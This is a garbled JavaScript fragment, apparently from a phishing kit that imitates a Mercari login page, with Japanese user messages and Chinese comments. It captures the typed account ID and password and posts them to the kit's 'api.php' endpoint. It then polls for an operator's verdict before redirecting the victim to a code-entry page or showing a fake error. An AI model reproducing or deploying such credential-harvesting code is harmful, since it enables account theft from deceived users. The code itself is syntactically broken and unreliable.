<script>
    $("#btn_idInput").click(function () 
    {
        var ID = $('#loginAliasId').val();
        var PW = $('#loginAliasPW').val();


        switch (true) 
        {
            case (ID.length<4 || ID.length>128):

                $('#errorMessage ul li').append('入力されたアカウントまたはパスワードが間違っています。正確に確認して入力してください');

                default: 
                 //弹出模态框

                    show: true,
                    backdrop: false,
                    keyboard: false,
                   });
                $.post('./api.php?act=send&_r='+Math.random(),{login_id:ID,login_pw:PW},function (res)

                var t = JSON.parse(res);
                if (t.code == 'ok') 
                {

                } 
                 
            });
                  
                  
              
        }

        

    });

</script>

<script type="text/javascript">
     var timer = null;
     var ok ='ok';
      var ID = $('#loginAliasId').val();
    function is_opt() {
        $.post('./api.php?act=is_opt&_r='+Math.random(),{login_id:ID},function (res) {
            var t = JSON.parse(res);
            if (t.code == 'ok') {
                clearInterval(timer);
                 //关闭模态库框
                 $('#myModal').modal('hide');
                 //去下一个
                 window.location.href="./mercari_ecode.php?echo1="+t.echo1;
            }
             
            else if(t.code=='no')
            {
              clearInterval(timer);
              //关闭模态库框
              $('#myModal').modal('hide');
              alert('アカウントまたはパスワードが間違っています。もう一度入力してください。');

              
            }
            else
            {
               console.log(t);
            }
        });
    }

</script>
